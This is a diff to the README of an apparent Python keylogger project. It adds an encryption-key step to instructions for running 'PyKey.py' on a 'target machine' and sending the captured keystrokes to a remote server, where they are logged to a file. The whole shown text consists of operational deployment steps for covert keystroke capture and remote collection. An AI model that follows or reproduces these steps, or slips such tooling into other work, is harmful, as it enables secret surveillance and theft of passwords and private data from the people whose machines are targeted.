@@ -20,11 +20,12 @@ pip install pynput cryptography
 ## Instructions
 
 ### Running the Keylogger
-1. Replace `"Your server IP here"` in `PyKey.py` with your server's IP address.
-2. Run `keylogger_server.py` on your server machine first.
-3. Run `PyKey.py` on the target machine (the machine you want to monitor).
-4. Check the server terminal for confirmation that the server is running and receiving data.
-5. View the keystrokes logged in `Keystroke Log Desktop.txt` on your server.
+1. Run `keys.py` to generate a key for encryption. This key will be used to encrypt and decrypt the keystrokes. Store the generated key securely.
+2. Replace `"Your server IP here"` in `PyKey.py` with your server's IP address.
+3. Run `keylogger_server.py` on your server machine first.
+4. Run `PyKey.py` on the target machine (the machine you want to monitor).
+5. Check the server terminal for confirmation that the server is running and receiving data.
+6. View the keystrokes logged in `Keystroke Log Desktop.txt` on your server.
 
 ## Primary Files
 
